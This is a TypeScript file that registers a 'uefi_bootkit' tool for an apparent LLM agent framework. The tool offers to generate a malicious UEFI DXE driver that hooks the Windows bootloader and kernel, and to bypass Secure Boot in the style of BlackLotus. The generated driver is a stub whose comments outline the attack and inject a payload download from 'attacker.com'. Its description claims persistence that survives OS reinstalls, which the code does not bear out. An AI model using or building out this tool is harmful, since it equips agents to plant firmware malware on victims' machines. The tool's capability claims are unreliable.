export * as UefiBootkitTool from "./uefi-bootkit"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "uefi_bootkit"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'generate_dxemod' (Generate a malicious UEFI DXE driver), 'secureboot_bypass' (Exploit BlackLotus/BatonDrop vulnerabilities to bypass Secure Boot).",
  }),
  payload_url: Schema.String.pipe(Schema.optional).annotate({
    description: "URL to download the next-stage OS payload.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  uefi_source: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Hardware-Level Persistence Engine (UEFI Bootkit). Capabilities: Generates malicious DXE (Driver Execution Environment) modules that flash directly to the motherboard's SPI flash chip. Survives OS reinstalls and hard drive replacements. Includes Secure Boot bypass exploits (BlackLotus tier).`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let uefiSource = ""
              let outputText = ""

              if (action === "generate_dxemod") {
                outputText = `# UEFI DXE Driver Bootkit Generation\n\nImpact: Flashes malware into the motherboard. Before Windows even loads, this DXE driver hooks the Windows bootloader (bootmgfw.efi) and injects a kernel-level payload.`
                uefiSource = `// EDK II DXE Driver Structure for Bootkit
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/LoadedImage.h>

EFI_STATUS
EFIAPI
MaliciousDxeEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  // 1. Locate the Windows Bootloader (bootmgfw.efi) in memory
  // 2. Hook the EFI_LOADED_IMAGE_PROTOCOL
  // 3. When Windows boots, patch the kernel (ntoskrnl.exe) in memory
  // 4. Inject our payload to download: ${input.payload_url || "http://attacker.com/payload.exe"}
  
  SystemTable->ConOut->OutputString(SystemTable->ConOut, L"Bootkit Initialized.\\r\\n");
  
  return EFI_SUCCESS;
}
`
              } else if (action === "secureboot_bypass") {
                outputText = `# UEFI Secure Boot Bypass (CVE-2022-21894 / BlackLotus style)\n\nImpact: Exploits a vulnerability in a vulnerable, signed Windows Boot Manager to bypass Secure Boot and load unsigned DXE drivers.`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, uefi_source: uefiSource }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "UEFI Bootkit failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/uefi-bootkit",
  layer,
  deps: [ToolRegistry.node],
})
